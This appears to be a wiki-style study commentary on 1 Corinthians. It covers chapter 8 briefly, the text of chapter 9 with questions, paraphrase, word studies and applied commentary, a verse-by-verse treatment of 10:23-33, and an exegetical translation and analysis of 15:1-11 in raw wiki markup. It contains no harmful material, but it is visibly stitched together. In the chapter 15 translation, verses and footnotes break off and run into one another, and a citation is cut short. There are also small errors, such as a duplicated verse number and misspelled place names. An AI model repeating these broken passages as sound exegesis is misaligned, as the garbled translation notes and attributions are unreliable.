Verses one through three talk about knowledge and love, everyone has knowledge but not everyone has love.  Paul insists that what really matters is love, which builds up the community (Hays).  Verses four through six discuss the meaning of eating meat sacrificed to idols.  Idols have no meaning and whether you eat sacrificed food or not does not bring you closer to God or further away from God.  Verses seven through thirteen deal with freedom to be exercised with care.  Not everyone has the knowledge talked about in verses one through three so Christians need to be careful how, where, and when they exercise their freedom because they may lead people to sin.  Gaebelein sums it up: “Speaking to the “strong” brother in verse twelve, Paul is saying, ‘If you cause the weak brothers to stumble into sin, you yourselves are sinning in a twofold way: (1) against your brothers and (2) against Christ in that you are wounding the conscience of those who belong to Christ.’”  The knowledge Paul now speaks of is the perceptive knowledge regarding an idol and the existence and position of the “so-called gods” (Gaebelein).

&lt;sup&gt;1&lt;/sup&gt;Am I not free? Am I not an apostle? Have I not seen Jesus our Lord? Are you not the result of my work in the Lord? &lt;sup&gt;2&lt;/sup&gt;Even though I may not be an apostle to others, surely I am to you! For you are the seal of my apostleship in the Lord. 
&lt;sup&gt;3&lt;/sup&gt;This is my defense to those who sit in judgment on me. &lt;sup&gt;4&lt;/sup&gt;Don't we have the right to food and drink? &lt;sup&gt;5&lt;/sup&gt;Don't we have the right to take a believing wife along with us, as do the other apostles and the Lord's brothers and Cephas? &lt;sup&gt;6&lt;/sup&gt;Or is it only I and Barnabas who must work for a living? 

&lt;sup&gt;7&lt;/sup&gt;Who serves as a soldier at his own expense? Who plants a vineyard and does not eat of its grapes? Who tends a flock and does not drink of the milk? &lt;sup&gt;8&lt;/sup&gt;Do I say this merely from a human point of view? Doesn't the Law say the same thing? &lt;sup&gt;9&lt;/sup&gt;For it is written in the Law of Moses: &quot;Do not muzzle an ox while it is treading out the grain.&quot; Is it about oxen that God is concerned? &lt;sup&gt;10&lt;/sup&gt;Surely he says this for us, doesn't he? Yes, this was written for us, because when the plowman plows and the thresher threshes, they ought to do so in the hope of sharing in the harvest. &lt;sup&gt;11&lt;/sup&gt;If we have sown spiritual seed among you, is it too much if we reap a material harvest from you? &lt;sup&gt;12&lt;/sup&gt;If others have this right of support from you, shouldn't we have it all the more? 

&lt;sup&gt;13&lt;/sup&gt;But we did not use this right. On the contrary, we put up with anything rather than hinder the gospel of Christ. 13Don't you know that those who work in the temple get their food from the temple, and those who serve at the altar share in what is offered on the altar? &lt;sup&gt;14&lt;/sup&gt;In the same way, the Lord has commanded that those who preach the gospel should receive their living from the gospel. 

&lt;sup&gt;15&lt;/sup&gt;But I have not used any of these rights. And I am not writing this in the hope that you will do such things for me. I would rather die than have anyone deprive me of this boast. &lt;sup&gt;16&lt;/sup&gt;Yet when I preach the gospel, I cannot boast, for I am compelled to preach. Woe to me if I do not preach the gospel! &lt;sup&gt;17&lt;/sup&gt;If I preach voluntarily, I have a reward; if not voluntarily, I am simply discharging the trust committed to me. &lt;sup&gt;18&lt;/sup&gt;What then is my reward? Just this: that in preaching the gospel I may offer it free of charge, and so not make use of my rights in preaching it. 

&lt;sup&gt;19&lt;/sup&gt;Though I am free and belong to no man, I make myself a slave to everyone, to win as many as possible. &lt;sup&gt;20&lt;/sup&gt;To the Jews I became like a Jew, to win the Jews. To those under the law I became like one under the law (though I myself am not under the law), so as to win those under the law. &lt;sup&gt;21&lt;/sup&gt;To those not having the law I became like one not having the law (though I am not free from God's law but am under Christ's law), so as to win those not having the law. &lt;sup&gt;22&lt;/sup&gt;To the weak I became weak, to win the weak. I have become all things to all men so that by all possible means I might save some. &lt;sup&gt;23&lt;/sup&gt;I do all this for the sake of the gospel, that I may share in its blessings. 

&lt;sup&gt;24&lt;/sup&gt;Do you not know that in a race all the runners run, but only one gets the prize? Run in such a way as to get the prize. 

&lt;sup&gt;25&lt;/sup&gt;Everyone who competes in the games goes into strict training. They do it to get a crown that will not last; but we do it to get a crown that will last forever. &lt;sup&gt;26&lt;/sup&gt;Therefore I do not run like a man running aimlessly; I do not fight like a man beating the air. &lt;sup&gt;27&lt;/sup&gt;No, I beat my body and make it my slave so that after I have preached to others, I myself will not be disqualified for the prize.}}

== First Thoughts ==

When first reading over this, one may assume Paul is becoming very angry at his audience.  He comes off as trying very hard to defend himself, maybe because of the judgment he is facing or for whatever other reason.  It seems that he may be slightly contradicting himself, but as you read further into it, you may begin to realize what he is really trying to accomplish with this.  


== Questions ==

1. Why is he so frustrated?


2. Why does he have to use so many examples?


3. Is Paul for or against getting support from the church?


4. What are Paul’s intentions with this letter?


5. What does Barnabas have to do with this?


6. Why does he use the imagery of a runner?


7. How does Paul view serving the Lord?


8. Are there deeper meanings to some of the examples he uses?


9. Does he think that receiving support from the church is bad?


10. What are Paul’s passions in his ministry?


11. Do these passions get in the way of his goal?


== Historical Background ==

To understand the people that Paul was writing to, one must first have a better understanding where these people were from. 

 
Corinth was a city on the Gulf of Saros.  This was a very popular stopping spot for captains and those looking to sell items.  Corinth was the most wealthy and most important city at that time in Greece.  It was the capital of Achaia, a Roman province, and its population was estimated as high as 600,000.  There was a market place in the center of the city where the temple of Apollo stood, which is still the most well-known ruin from that time. (Craig, 3-4)


== Paraphrase ==

1 Am I not allowed to speak out?  Am I not the one who has seen our Lord?  Are you not the result of what I have done for the Lord? 2 Even though I am not everyone’s apostle, I am to you!  You are the reason I work for the Lord.


3 This is what I have to say to those who judge me. 4 Don’t we all have the right to eat and drink?  5 Don’t we all have the right to take a wife with us, as do others we have known?  6 Or is it only Barnabas and me who have to work for our living?


7 Who serves as a soldier at the cost of his own life?  Who plants gardens and does not eat what they grow?  Who tends to a flock and does not drink the milk they get?  8 I do not only say this from a human point of view.  Doesn’t the law say the same thing?  9 The Law of Moses states: &quot;Do not muzzle an ox while it is treading out the grain.”  Is it the oxen that God is worried about?  10 He says the same for us, don’t you think?  Yes, this was written for us, because when they each do a part of the work, they do it hoping they will share the harvest.  12 If you work on the harvest, shouldn’t you get some of it?


We did not do this right.  We did whatever needed rather than hindering the gospel of Christ.  13 Did you know that those who eat at the temple get their food from there, and those who serve at the alter share what is offered there?  14 In the same way, the Lord commanded us to share his word so that we may get something out of it.


15 But I have not received any of these rights.  I am not writing this as a hint that I want them.  I would rather die than have someone take away this joy of doing it for free.  16 When I preach, I do not boast, because I am obligated to.  That would be bad on my part if I did not preach.  17 If I preach voluntarily, I have a reward; if not voluntarily, I will lose this trust given of me.  18 What is my reward then?  It is that I offer my preaching free, and that I have given up all my rights to preach it.


19 I am free, but I am a slave to others, so I may win as many as possible.  20 To the Jews I became like them, to win them.  TO those under the law I became like the to win them.  21 To those without the law I became like them to win them.  22 I became like the weak to win the weak.  I have become all these to try and save as many as I can.  23 I do all this for the sake of the gospel, but also so I may receive its blessings also.


24 Runners race to win the prize.  We should run like this, hoping to receive the prize.  25 Those who are runners have to train.  Their prize is not one that will last, but we run the race to win a crown that will last forever.  26 Because of this, I do not run like a man without discipline.  27 I give it everything I have so that I may be an example to others, and so I will not lose the joy of the prize.


== Key Words ==

(vs.1)Apostle


(vs.2)Seal of apostleship


(vs.9) Law of Moses


(vs.14) Gospel


(vs.15)Boast


(vs.19)Gain


== Word Study ==

Vs. 1 Apostle- The Greek word for this is “apostolos” meaning “sent out one”.


Vs. 15 Boast(NIV), Glorying(KJV)- This is not meant to come off as having a big ego.  It is a conviction Paul has felt.  The Greek term for glorying (kauchema) means “joyous feeling of the moral worth of one’s own actions.” (Metz, 399-400)


Vs. 19 Gain(KJV), Win(NIV)- This is a word commonly used by missionaries.  The Greek word for it is “kerdaino”, which usually means to gain.  This sounds more like gaining possessions, so when used to “gain people” it makes more sense to use the word “win”. (Earle, 60)

== Commentary ==

(9:1) Paul lists off all these questions as to what rights he had as an apostle.   He asked questions in which the answers are known, but he did it in a way so he could share more about what it means to be an apostle.  Just because he is an apostle does not mean that he loses all his rights as a human.  Some of the questions look to the past and some forward. (Interpreter’s Bible, 98)  He shares that he is not controlled by these laws.  He has freedom.  This freedom he has though is much greater than most because he is an apostle.  He has many privileges because he is an apostle. (Metz, 395)


(9:2) Paul is showing those who do not believe in him being an apostle why he is and who he is helping.  He explains to them that he is an apostle for them, even if not for everyone else, they are the reason for his apostleship.  Paul uses the word “seal”.  This means that he is “connected with the gift of the Spirit.” (Craig, 98-99)


(9:3) Paul uses the word “defense” here.  This could mean that he was being attacked about his apostleship.  People did not believe that he was a real apostle because he did not take the support given by the church. (Craig, 99)


(9:4) Even though Paul turned down support from the church does not mean that he does not have the right to eat what is served.  It is because of his dedication that he turns this down. (Metz, 396)


(9:5) Paul was using another example of a right that he had as an apostle.  He had the right to have a wife come along with him. 
(9:6) Work is the big issue in this verse.  Paul is referring to manual labor.  Because Paul is making his own money and trying to make a living without the churches support, he has to do a lot of manual labor, which the Greeks did not agree with.  Greek philosophers thought of these men who do manual labor to be worth less than people like businessmen and soldiers. (Metz, 397)

(9:7-8) All of these questions are rhetorical.  Paul is again defending himself as an apostle.  In all three of these scenarios, the person has to live off of what they provide.  A soldier has to fight with what he is given, a man who plants a vineyard receives his portion it, and a shepherd lives off of what he raises.  Paul is giving example that relate to him.  He is showing that you should be able to live off of your own work if you chose. (Metz, 397)


(9:9-12) The law says that you should not muzzle an ox.  Jews thought of these animals as God’s creation so they deserved to be treated in a humane way.  They have a reward through the grain they were allowed to eat.  Paul compares this to the work of the apostles.  Why should they not be able to benefit from what they have done? (Metz, 398) (Craig, 101-102)


(9:13-14) Paul is comparing his work to a Priest, but not saying he is like a Priest.  He is showing how they would get a lot of support from the church.  If you are going around sharing the gospel, then you should be getting help from it.  You should not have to do work without pay. (Metz, 398-399) (Craig, 102)


(9:15-18) Paul has not accepted any of the support given him by the church, and he did not write this letter to try and get money from them.  He says that he would rather die than to accept what they were giving him.  He really just wants to preach to them for free.  He states that he does not deserve the credit they are giving him.  He is not an apostle to be paid and recognized for his work.  If you are called to do something and you go, you do not need or deserve the credit that they are trying to give you.  He is doing this out of self sacrifice. (Metz, 400) (Craig, 102-103)


(9:19-22) Paul gave up all of himself to serve the Lord.  He understood that to reach these people he had to put aside his thoughts and disregard what they thought of him and try to understand them better.  How can you preach to someone if you do not know who they are?  It meant more to him to try and win them to Christ than to try and fight with them over their thoughts of him. (Metz, 402)
(9:23) Paul had reasons why he thought of ministry like this.  He did this not only to share the gospel with others, but also so he might have the experience of living his life fully for Christ. (Metz, 402)


(9:24-27) Paul uses an image that most people could relate to or at least understand.  Athletics were well known in that time.  He uses a runner for an example.  Runners have to have a lot of discipline and motivation.  Their motivation is the prize for winning the race.  Paul says that we should all be living like we are in a race to win a prize.  Then he compares that small prize to what would really be the prize.  The crown will last forever, but the earthly prize only lasts for a small amount of time.  The only one that can hold you back is yourself.   Paul also says that it would be very disappointing if you were telling others how to run this race, but did not make it yourself.   Discipline is a big part of running this race for Christ. (Metz, 402-403) (Craig, 105-106)


== Intentions ==

Paul’s intention in writing this was not to try and receive money or any of the other rights he previously talked about.  He was not planning on changing the purpose of his letter.  Paul was adamant about making his own living and not getting support from the church, to the extent that he would rather die than accept help. (vs. 15)  He does not want to receive any credit for the things he is doing because he believes he does not deserve them. (vs. 16)  Paul’s intention with this letter is to share what he is doing and why he is doing it.  He feels called by God and is not only preaching the gospel so others may receive the prize, but also so he will not miss out on it. (Metz, 399-400)

== Final Thoughts: How to apply it to today ==


Paul set a very good example for us in this letter.  He stands up for what he is doing.  He knows that he has the same rights as anyone else then, but he sacrifices everything to serve Christ as he was called to do.  Why should he be recognized for something he is called to do?  He turns down all support from the church so he can provide for himself.  His reward is seeing all the people that are now living for Christ and through this he will receive the final prize too because he is living how God has called him to.  He recognizes that he cannot be preaching these things and not be practicing them himself.  What good would that do?  


Paul also sets an example of how to truly reach out to people and set an example.  First is through practicing what he preaches, but also through relationships.  He lives among these different groups and gets to know them and has a better understanding of who they are and their ways of doing things.  Through this he has a better understanding of how to witness to them and share.  He does not let their comments bother him and pushes on towards winning these others to Christ.  He wants everyone to share in this joy of living for Christ and receiving the final prize.  


We can apply this to our lives today in many ways.  God has called all of us to serve Him and to help more people find joy in Him.  How can people see this if those who are witnessing to them are still living the way they are?  Why should we take all the credit for something that we are called to do?  We are living for Christ not only to be an example for others, but also to receive our prize that we have worked so long for.

      <text xml:space="preserve">==Paraphrase vs. 23-33==
Everything is allowed, but not everything is helpful or constructive.  Nobody should seek their own good, but instead good for others.  Eat whatever is sold at the butchery and don’t worry where it came from since all things came from God’s earth.
If a non-Christian has you over for dinner and you want to go, don’t be a bad guest and not accept what the host is offering.  However if someone specifically says, “This has been offered in sacrifice” don’t eat it for both you sake and theirs.  Specifically theirs since they are not open-minded enough to see its spiritual unimportance. No matter what you eat or drink, don’t let others condemn you for thanking God for your meal.
So when you have a meal, eat it for the glory of God, this includes not causing offence to other people with other beliefs.  Just as I (Paul) try to not upset others, you too should try and consider other so that they may become saved.

==Verse by Verse Commentary==

===Verse 23===
Paul begins the last section of Corinthians chapter 10 with a reminder to the church that “Everything is permissible”  The wording of this verse is almost identical to earlier in Corinthians at 6:12. While the context in chapter 6 was specifically sexual impurities, the specific meaning of this phrase in both sections is that humans have free will.  Saying that “everything is permissible” isn’t specifically in reference to any social or even religions permissibility, but instead a general idea of choice, Paul received most of the wording for this understanding from preexisting Greek philosophical texts.  Paul continued with the general language of the Greek philosophers and continues to say that while things are permissible they may not be beneficial or constructive.   The Greek teachers of the age would use a scale of usefulness to see if actions were worth undertaking.  Paul adopts this philosophy and applies to more specifically to Christianity.

===Verse 24===
Paul finishes his general philosophical call with a reiteration of the golden rule; however he specifically puts the emphasis on the good for others.  This call towards a life of selflessness can be understood as one of the (if not thee) driving principles of Jesus’ ministry.  Verses 23 and 24 are set up as prerequisites for the rest of the chapter as they remind Christian’s of their opportunity for choice, and their necessity make that choice love.

===Verse 25===
the passage becomes more centralized as we quickly learn that this section deals with the consumption of different foods and drinks, especially those that were used in pagan sacrifices. To understand this verse you must have some understanding of the historical context that lies behind it.  Judaism and Christianity are not the sole religious systems found near the Mediterranean Sea, and in fact once you move past Israel and into Grease you find that cities like Corinth have a large pagan population.  One chief aspect of these traditions is the sacrificing of animals to their gods.  While most of the food went to the local prophets or their own family, some would end up back at the market place.  The worry that some first century Christians had was that they would inadvertently eat food previously offered to another pagan god.   Paul is writing here to ease those with this concern by telling them that ignorance is bliss, if they are unaware of the foods origins, eat it without raising questions of conscience.

===Verse 26===
Paul backs up his claim in verse 25 by reminding the Christians in Corinth that “The earth is the Lord’s.”  This comes directly from Psalm 24:1 which states the glory of God and God’s creation.  Just as in Peter’s account with God and the sheet of unclean food.  Paul is writing to remind his readers that everything on earth is from God, so everything must be good.

===Verse 27===
Verse 27 through 29 state the importance of social obligations by Christians to non-Christians.  Just as we see in Luke 11:37, Jesus hoped to break down the societal barrier that caused this divided as he regularly ate with Pharisees and tax collectors.  Paul continues this new tradition by telling those in Corinth to eat with non-believers and more specifically to be respectable guest at the same time by not questioning or denying everything put before you.

===Verses 28 &amp; 29===
these next verses are for the most part summarized versions of 1 Corinthians 8:7-13. They address the question of what to do if another weaker Christian brother or sister notices that the food was offered to idols and feels it unclean to eat.  As the stronger follower of Christ, you understand that eating the offered food has no spiritual implications; however you must respect the beliefs and short comings of your weaker friend and not partake in the food for their sake.  This does however raise a few questions from the text.  when and how do you inform the weaker brother of his misunderstanding, and also who does Paul have in mind when wiring this letter since it seems that only the “strong” Christians will be reading it. 

===Verse 30===
Giving thanks for meals is a tradition that can be traced far back into Jewish heritage, alive in first centaury Christians (Romans 14:6) and can still be seen today in almost all forms of Christianity.  Paul reemphasizes the importance of being grateful for having food and unimportance of were that food came from, he states, “Why am I denounced because of something I thank God for?


===Verses 31 &amp; 32===
from verse 31 to 33 we find a summary of Paul’s thoughts on what is important to think about in regards to food and drink.  Paul states another central theme of the New and Old Testament (Deut. 6:4-5, Psalm 63:1) with the call to, ”do it all for the glory of God.”  However right after this he retouches his second point that we should “not cause anyone to stumble” including those within and apart from the Church of God.

===Verse 33===
Paul ends with the same plea for Christians that he begins with, to seek the good of many over your own good.  The last line explains “so that they may be saved.”  This passage in scripture is undeniably a call for Christians to not become overly concerned with trivial maters of practice, and instead focus on the greater goal of loving others and bringing people to Christ.  It forces us to question how well Christians have been able to accomplish this task over the centuries, and what must still be done.

===Exegetical Translation from the Greek Text===

&lt;blockquote&gt;
'''1''' Now I would like to remind you, brothers and sisters,{{#tag:ref|The Greek word αδελφοί technically means &quot;brothers.&quot; However, it is frequently used generically in the plural (as it is here) in Greek literature to refer to a mixed-gender group of &quot;siblings.&quot; Indeed, in the plural especially, the word often is used to refer to all close family members.&lt;ref&gt;Günther, Walther. &quot;Αδελφός.&quot; ''The New International Dictionary of New Testament Theology.'' Colin Brown, Ed. Version 2.0. (Grand Rapids: Zondervan, 1986). ''Accordance Bible Software.'' OakTree Software, inc. Version 8.2.2, March 2009.&lt;/ref&gt; Thus, because there are no indicators that the passage is only addressed to males, including &quot;sisters&quot; with brothers is well supported.|group=&quot;tn&quot;}} of the very Gospel--the Good News--{{#tag:ref|This is an attempt to render a phrase into English from the Greek that is very difficult to translate the important nuances: ευαγγέλιον ό ευηγγελισάμην. As can be easily seen in this even without knowing the meaning of the words, the verb (ευηγγελισάμην) and the direct object (ευαγγέλιον) share a redundant root. Translated most literally, the phrase says &quot;the gospel that I proclaimed the gospel to you&quot;--which is indeed bad English--or, perhaps one could wordsmith as Paul so often does, and translate it as &quot;the gospel that I 'gospelled' to you.&quot; Many translations simply say &quot;the gospel that I proclaimed to you&quot; (NRSV) or &quot;that I preached to you&quot; (NIV, ESV, NASB) but this does not pick up the full potency of Paul's emphasis. Paul could have used a different verb for &quot;preach,&quot; such as κήρυσσω (which would have voided such redundancy) and so it is likely that such redundancy of the root word is intended for special emphasis. Thus, in this translation, &quot;the very Gospel--the good news--...&quot; emphasizes both the redundancy for emphasis and also the fact that the Good News is passed on--not just a story that Paul created. In the context of this section, the reality of the message is of chief importance to Paul, as he is laying a foundation for all the sections that follow.|group=&quot;tn&quot;}} that I brought to you as a messenger,{{#tag:ref|While most all translations translate the verb ευηγγελισάμην as &quot;preached&quot; or &quot;proclaimed&quot;, these translations could imply that the Corinthians could have received a unique articulation of the message by Paul as an act of contextualized preaching. But Paul's point in this section is instead to point to something he is ''handing on'' from those that came before him. He cites a church creed beginning in '''verse three''' that was not specific to the Corinthian church, but rather universal to the whole church. Furthermore, as opposed to κήρυσσω (also meaning &quot;preach or proclaim&quot;), which emphasizes the act of speaking, ευηγγελισάμην emphasizes the act of carrying a message to somebody--in this case, the Good Message.

And while &quot;for&quot; technically works, it is not nearly specific enough to what the word actually means. The preposition, used with a genitive object that is a thing (as opposed to a person) carries a meaning of action being done on the behalf of something. There is also a somewhat causal relation carried in the preposition &lt;ref&gt;Danker, 1030-1031.&lt;/ref&gt; Thus, the presence of this preposition--especially within a creedal formulation--establishing a substitutionary, causal relationship between our sin and Christ's death demands an atonement theory.&lt;ref&gt;Fee, 724; Thiselton, 1191.&lt;/ref&gt;|group=&quot;tn&quot;}} our sins, according to the Scriptures,

The translation of the word in this verse, however, needs to be different from the previous instance.

However, here in verse six, Paul is citing witnesses to the ''historical'' events of the resurrection appearances. In the Greco-Roman world, women were not considered valid witnesses, which is why he does not cite any women in particular--despite the fact that the gospels unanimously describe women as the first witnesses to the empty tomb.&lt;ref&gt;Collins, Raymond F.

&lt;blockquote&gt;
The translation of αδελφοίς provides the usual nightmare for modern English. Since Jesus appeared to the women, it is virtually certain that NIV's ''brothers and sisters'' is correct, but the Greek does not say this, and if it is gender-inclusive, it is also gender intrusive.&lt;ref&gt;Thiselton, 1205.&lt;/ref&gt;
&lt;/blockquote&gt;

Thus, the translation here is gender-''exclusive'' because this author believes that this is most faithful to Paul's ''intended'' meaning, which would be naturally assumed by the Corinthian readers. However, the modern reader should understand that there likely were women who also witnessed first-hand this mass appearance of the resurrected Christ.

===Background Information===

====Historical Context====

While there is much information available about the Corinthian church, the information about its situation that occasioned ''this section'' (vv. 1-11) is somewhat debated. With this said, there is some particular insight into the occasion of Paul's transitions in '''verse one''' to this subject.

It appears, from an analysis of both this chapter, and of the epistle as a whole, that there was some theological confusion in the community, amongst other issues, that Paul needed to sort out. Of particular relevance in this situation is the Corinthian church's understanding of what &quot;living in the Spirit&quot; entailed. It seems that the church had drifted into a somewhat docetic notion that in receiving the Spirit, one enters an angelic form of spirituality where the corporeal is &quot;unneccessary and unwanted, and would finally be destroyed.&quot;&lt;ref&gt;Fee, 715.&lt;/ref&gt; Garland points out that this heterodoxy is not rebellious in nature, but rather some Hellenistic conceptions of spirituality that had crept into the church:

&lt;blockquote&gt;
The Corinthians' error is not rooted in some deliberate rebellion but in honest confusion, given their Greek worldview. They fail to comprehend how an earthly body that is physical and perishable can be made suitable for a heavenly realm that is spiritual and imperishable.&lt;ref&gt;Garland, 678&lt;/ref&gt;
&lt;/blockquote&gt;

In other words, the bodily resurrection of the dead (which was typically assumed within a Judeo-Christian philosophy) had not been properly translated and articulated to the Hellenistic Christian church.&lt;ref&gt;Fee, 716.&lt;/ref&gt; This was necessary for Paul to rectify, as it has definite implications for the life of the church. It is ultimately 

&lt;blockquote&gt;
...the foundation of all preaching about Christ. Without it, the gospel dwindles into an inspiring story of a wise teacher who suffered heroically as a victim of human perfidy. Paul hints that if they deviate from this belief, it brings their salvation into question.&lt;ref&gt;Garland, 679.&lt;/ref&gt;
&lt;/blockquote&gt;

Another aspect of the Corinthian situation relating to this section is rather debated and that is the general opinion of the Corinthians regarding Paul. Some scholars, most notably Gordan Fee, believe the Corinthians have a very low regard for Paul. They see passages such as 1:12 (in which Paul says that some say they belong to him, while others Apollos, or Cephas, or Christ) as an interpretive key to understand 15:8-11. Thus, according to Fee and others, Paul is here ''defending his right to his apostolate'' so that they accept what he says about that which follows. Scholars in this interpretation of the Corinthian situation point especially to '''verse eight''' and consider Paul to be quoting an insult that has been cast at him by some of the Corinthians.&lt;ref&gt;Collins, 537; Fee, 733-736.&lt;/ref&gt; In language of Greco-Roman rhetoric, these scholars believe Paul is building his ethos.

Other scholars disagree that Paul is fending off a diminutive opinion of himself. Instead, they consider Paul to be reminding them of what he has already taught them about the resurrection of Christ. This is the interpretation that this author chooses, as it seems more grounded in what actually is ''in the text'' rather than speculation about possible scenarios ''outside'' the text. Verses 1-11, then, function to not legitimize Paul but rather to legitimize his message as being both a part of the church tradition, the apostolic witness, and also a part of Paul's personal testimony of Christ's life-giving and gracious calling to him.&lt;ref&gt;Thiselton, 1210.&lt;/ref&gt; With this said, it must be ceded that rhetorically, Paul is setting down a foundation of his argument to begin in verse twelve. And in so setting this up, Paul ''is'' building his ethos, as it is crucial for his readers to accept him on the ground of Christ's resurrection, if they are to agree with his logic. Thus, while Paul is in all likelihood ''not'' defending himself against a diminutive church opinion and against insults that have been flung his direction, rhetorically, vv. 1-11 must (at least in part) function to legitimize his following argument.

====Literary Context====

This chapter fits in at the end of the letter of First Corinthians, with the chapter that follows being mostly a conclusion. Paul has &quot;covered a lot of ground&quot; to this point, and it seems the eschatological corporeal resurrection of the saints is his final, perhaps climactic point. At the end of chapter fourteen, Paul concludes a lengthy discourse on proper worship that began in chapter eleven, which followed an even longer discourse on proper Christian behavior, both in the gathering of believers and in the world. It could then be said that Paul's focus up until this point has been orthopraxy (meaning &quot;right practice&quot;) and orthodoxy (which means &quot;right ''worship''&quot;, ''not'' &quot;right belief&quot;; contrary to popular belief, the &quot;-doxy&quot; in the word comes from δόξα, meaning &quot;honor,&quot; &quot;glory,&quot; and &quot;praise.&quot;&lt;ref&gt;Danker, 256-258&lt;/ref&gt;). Now, as Garland so aptly points out, Paul transitions from &quot;disorderly worship to disorderly belief&quot; &lt;ref&gt;Garland, 678.&lt;/ref&gt;

Verses 1-11 serve as a &quot;narratio&quot;--essentially a citation of common ground that Paul gives, upon which his following argument will be built.&lt;ref&gt;Collins, 526&lt;/ref&gt; The essential grounds upon which Paul's following argument is based, beginning in verse twelve, is that Christ was raised. If the Corinthians do not agree with that, then the rest of his argument comes crashing down. Verses 1-11, then, are absolutely crucial in the chapter.

Thankfully, the Corinthians already know and believe that Christ was raised from the dead ''in bodily form''. Paul is not attempting to ''prove'' anything in these verses and neither does he have to.&lt;ref&gt;Fee, 715.&lt;/ref&gt; Rather, Paul is ''reminding'' them of what they already know, as is clearly stated in '''verse one'''. What Paul does, then, is bring up what the Corinthians already know, and then emphasize the absolute centrality in the gospel message of this Christ's resurrection by pointing to its presence in church tradition (in the form of a creed), the apostolic witness, and especially in Paul's personal, first-hand experience. If Paul can prove that the resurrection of Christ is absolutely central in the all these realms of the church, then his argument to follow is firmly grounded.

The content in this section of verses is typically Pauline, except for a the section of verses from vv. 3b-5, which most modern scholars have considered to be a traditional church creed, based upon the structure and vocabulary. This will be covered in greater depth in the analysis, so it will suffice here to say that some of the content of this section is not Pauline and finds its origin earlier than the rest of the material.

===Analysis===

====Paul's Preface - A Reminder of Common Ground, Church Tradition: vv. 1-3a====

In this section, Paul is calling to memory the Gospel that he knows the Corinthians have embraced. The phrase Paul is using here in '''verse one''' (γνωρίζω υμίν) is one he typically uses to recall already known information or state the obvious with which he knows his readers will agree (e.g. 1 Cor 12:3, Gal 1:11).&lt;ref&gt;Collins, 533.&lt;/ref&gt; As described in translation note 3, the emphasis here is not on Paul's preaching but rather on the very content of the gospel message. The word that is frequently translated as &quot;preached,&quot; and translated above as &quot;brought to you as a messenger&quot; shows its emphasis in the transmission of good news by a messenger. This word well coincides with the word for &quot;received,&quot; which is the Greek word παρελάβετε. This word has two roots, πάρα, which typically refers to a point of origination, something that is exterior to oneself,&lt;ref&gt;Danker, 756.&lt;/ref&gt; and λαμβάνω, which means to take or receive.&lt;ref&gt;Danker, 583.&lt;/ref&gt; This, then, is significant: the word does not simply mean to receive, but rather to receive something down a line from outside oneself. It seems to connote longevity of the message--which is exactly the point Paul is making here in vv. 1-11: the message of Christ's resurrection has a long-standing tradition. In Hellenism and in Judaism, furthermore, the word was used to refer to the taking over a tradition.&lt;ref&gt;Siede, Burghard. &quot;Παραλαμβάνω.&quot; ''The New International Dictionary of New Testament Theology.'' Colin Brown, Ed. Version 2.0. (Grand Rapids: Zondervan, 1986). ''Accordance Bible Software.'' OakTree Software, inc. Version 8.2.2, March 2009.&lt;/ref&gt; Thus to carry the good news as a messenger fits with this understanding of embraced tradition.

In '''vv. 1-2a''', there is a definite progression of tenses. &quot;Received&quot; is in the aorist tense, which is a simple past tense. At some point in time, in the past, the Corinthians received the Gospel. The next verb, εστήκατε, is in the perfect tense, which is a past tense that continues into the present in its effects. Many translations (such as the NASB, NRSV, among others) translate the word as &quot;in which you stand.&quot; However, as pointed out by Thiselton, this word is regarding &quot;present stability on the basis of past action as well as present state.&quot;&lt;ref&gt;Thiselton, 1185.&lt;/ref&gt; Thus, in the translation in this commentary, &quot;on which you have taken your stand&quot; was chosen, as it emphasizes a definite past action which continues on until now. Lastly, &quot;you are being saved,&quot; coming from the word σώζεσθε, is present tense. This tense in Greek emphasizes continual activity. Many translations translate the word as &quot;are saved.&quot; However, this seems to imply punctiliar salvation, which we can be reasonably sure that Paul is ''not'' talking about.

Also of relevance is the grammatical voice in which the salvation occurs. Σώζεσθε is in passive voice, which means that saving activity is being wrought by another party. Salvation is not gained by the Corinthians as the natural effect of embracing the Gospel. The Corinthians are not the saving party. Theologically, this is very significant. Instead, the Corinthians receive the saving activity from another, namely God.&lt;ref&gt;Thiselton, 1185.&lt;/ref&gt;

In '''verse two''', there is a contingency put on the salvation of the Corinthians. Here, Paul says that they are being saved if they hold firmly to the content of the Gospel he brought to them. But how this contingency is to be understood varies. Collins, a Roman Catholic scholar, interprets it as such: &quot;Those to whom the gospel is preached are saved ''under the condition'' that they can hold fast to what they have heard&quot; (emphasis added).&lt;ref&gt;Collins, 533.&lt;/ref&gt; This interpretation means they will be saved ''only if'' they can hold firmly to the message. Garland, however, provides a much more Protestant interpretation, asserting that if they do not hold fast to the preaching about the Gospel, &quot;they ''jeopardize'' their future with God.&quot;&lt;ref&gt;Garland, 682.&lt;/ref&gt; Garland, then, does not put the act of holding firmly as having to do with their being saved, but rather with possibly losing their salvation. In light of what is action in the text, it seems that perhaps the former interpretation is better, as the conditional conjunction is modifying the salvation and it does not talk about losing salvation.

In the above translation, the word &quot;contents&quot; is derived from the word λόγος, which is typically translated as &quot;word.&quot; The reason why it does not take that translation here is because, as well noted by Thiselton, it can also refer to content or substance.&lt;ref&gt;Thiselton, 1185.&lt;/ref&gt; Very literally translated, the phrase reads &quot;...the word of the gospel that I proclaimed to you...,&quot; which is somewhat awkward. Instead, as seems more likely here, if λόγος is translated in the way Thiselton contends it should be, then it is referring to the particular contents of the larger message of the Good News--which are outlined in the creed beginning in verse 3b.

For an adequate covering of the issues concerning the translation of the phrase typically translated as &quot;believed in vain,&quot; see translation note 4 above.

'''Verse three''' begins with a Paul setting up the creed to follow in the second half of the verse, on through verse five. He uses two main verbs to describe the creed that follows: &quot;handed over&quot; (παρέδωκα) and &quot;received&quot; (παρέλαβον--the same word described in verse one). As can be easily observed of the Greek words, both have a common prefix. In the context of this passage, this prefix gives both the meaning of the transmission of tradition. Both words were used in 11:23 to describe the transmission of the communion tradition. What is important to note in these two words is that Paul is not describing anything that is originally his formulation. Instead, he is describing himself as simply conveying onto the Corinthians that which was conveyed to him.

====An Early Christian Creed: vv. 3b-5====

The second part of '''verse three''', on to the end of verse five, is believed by most scholars to be a traditional creed that Paul is citing. There are several reasons for this. First, the language in the first part of verse three seems to point to a ''specific'' tradition being passed on--one that did not originate with Paul. Also, vv. 1-2 seem refer to the Gospel in such a way that it needs articulation as to exactly what part of the Good News Paul is focusing on. A creed that Paul taught them would perfectly serve such a function. Beyond simply contextual hints, there are more technical reasons Scholars frequently give.

